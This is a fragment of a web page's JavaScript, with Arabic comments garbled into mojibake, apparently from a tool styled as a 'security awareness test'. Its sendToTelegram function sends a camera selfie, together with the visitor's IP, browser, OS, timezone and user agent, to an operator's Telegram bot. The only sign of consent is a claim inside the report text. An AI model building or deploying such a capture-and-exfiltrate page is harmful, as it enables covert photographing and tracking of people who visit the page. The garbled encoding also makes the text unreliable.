        async function sendToTelegram(photoBlob, deviceInfo) {
            try {
                // Ø¥Ù†Ø´Ø§Ø¡ Ù†Øµ Ø§Ù„ØªÙ‚Ø±ÙŠØ±
                const report = `
ğŸ” <b>ØªÙ‚Ø±ÙŠØ± Ø§Ø®ØªØ¨Ø§Ø± ÙˆØ¹ÙŠ Ø£Ù…Ù†ÙŠ</b>
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”

<b>ğŸ¢ Ø§Ù„Ù…Ø¤Ø³Ø³Ø©:</b> ${CONFIG.COMPANY_NAME}
<b>ğŸ“‹ Ø§Ù„Ø§Ø®ØªØ¨Ø§Ø±:</b> ${CONFIG.TEST_NAME}
<b>ğŸ•’ Ø§Ù„ÙˆÙ‚Øª:</b> ${deviceInfo.timestamp}

<b>ğŸ‘¤ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ù…Ø´Ø§Ø±Ùƒ:</b>
â€¢ ğŸ“± Ø§Ù„Ø¬Ù‡Ø§Ø²: ${deviceInfo.deviceType}
â€¢ ğŸ’» Ø§Ù„Ù…ØªØµÙØ­: ${deviceInfo.browser}
â€¢ ğŸ–¥ Ù†Ø¸Ø§Ù… Ø§Ù„ØªØ´ØºÙŠÙ„: ${deviceInfo.os}
â€¢ ğŸŒ Ø§Ù„Ù„ØºØ©: ${deviceInfo.language}
â€¢ ğŸ“ Ø§Ù„Ù…Ù†ØµØ©: ${deviceInfo.platform}
â€¢ ğŸ–µ Ø§Ù„Ø´Ø§Ø´Ø©: ${deviceInfo.screen}
â€¢ â° Ø§Ù„Ù…Ù†Ø·Ù‚Ø© Ø§Ù„Ø²Ù…Ù†ÙŠØ©: ${deviceInfo.timezone}
â€¢ ğŸŒ IP: ${deviceInfo.ip}

<b>ğŸ“± Ù…Ø¹Ù„ÙˆÙ…Ø§Øª ØªÙ‚Ù†ÙŠØ©:</b>
<code>${deviceInfo.userAgent.substring(0, 200)}</code>

â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
<i>ØªÙ… Ø¬Ù…Ø¹ Ø§Ù„Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø¨Ù…ÙˆØ§ÙÙ‚Ø© Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ø§Ù„ØµØ±ÙŠØ­Ø©</i>
ğŸ“Œ <a href="https://www.example.com/privacy">Ø³ÙŠØ§Ø³Ø© Ø§Ù„Ø®ØµÙˆØµÙŠØ©</a>
                `;
                
                // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±Ø© Ù…Ø¹ Ø§Ù„ØªÙ‚Ø±ÙŠØ±
                const formData = new FormData();
                formData.append('chat_id', CONFIG.CHAT_ID);
                formData.append('photo', photoBlob, 'selfie.jpg');
                formData.append('caption', report);
                formData.append('parse_mode', 'HTML');
                
                const response = await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                const result = await response.json();
                
                // Ø¥Ø±Ø³Ø§Ù„ Ø±Ø³Ø§Ù„Ø© ØªØ£ÙƒÙŠØ¯ Ù„Ù„Ù…Ø³ØªØ®Ø¯Ù… (Ø§Ø®ØªÙŠØ§Ø±ÙŠ)
                if (result.ok) {
                    // ÙŠÙ…ÙƒÙ† Ø¥Ø¶Ø§ÙØ© Ø±Ø³Ø§Ù„Ø© ØªØ£ÙƒÙŠØ¯ Ù„Ù„Ù…Ø´Ø§Ø±Ùƒ
                }
                
                return result.ok;
                
            } catch (error) {
                console.error('Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„:', error);
                return false;
            }
        }
        
        // ========== Ø¹Ø±Ø¶ Ø§Ù„Ø­Ø§Ù„Ø© ==========
        function showMessage(message, type) {
            statusMessage.textContent = message;
            statusMessage.className = `status-message status-${type}`;
        }
        
        async function showStatus(message, type) {
            testStatusText.textContent = message;
            if (type === 'error') {
                statusMessage.textContent = message;
                statusMessage.className = `status-message status-${type}`;
            }
        }
        
        // ========== Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø¯Ø¹Ù… Ø§Ù„Ù…ØªØµÙØ­ ==========
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            showMessage('âŒ Ù…ØªØµÙØ­Ùƒ Ù„Ø§ ÙŠØ¯Ø¹Ù… Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§. Ø§Ù„Ø±Ø¬Ø§Ø¡ Ø§Ø³ØªØ®Ø¯Ø§Ù… Ù…ØªØµÙØ­ Ø­Ø¯ÙŠØ«.', 'error');
            startBtn.disabled = true;
        }
        
        // ========== ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ (Ù„Ù„Ù…Ù†ØªØ¬ Ø§Ù„Ø§Ø­ØªØ±Ø§ÙÙŠ) ==========
        // ÙŠÙ…ÙƒÙ† Ø¥Ø¶Ø§ÙØ© Ù†Ø¸Ø§Ù… ØªØ³Ø¬ÙŠÙ„ Ø¯Ø®ÙˆÙ„ Ù„Ù„Ø´Ø±ÙƒØ§Øª Ù‡Ù†Ø§
        
        console.log('Ù…Ù†ØµØ© ÙˆØ¹ÙŠ - Ø¬Ø§Ù‡Ø²Ø© Ù„Ù„Ø§Ø³ØªØ®Ø¯Ø§Ù…');
    </script>
</body>
</html>
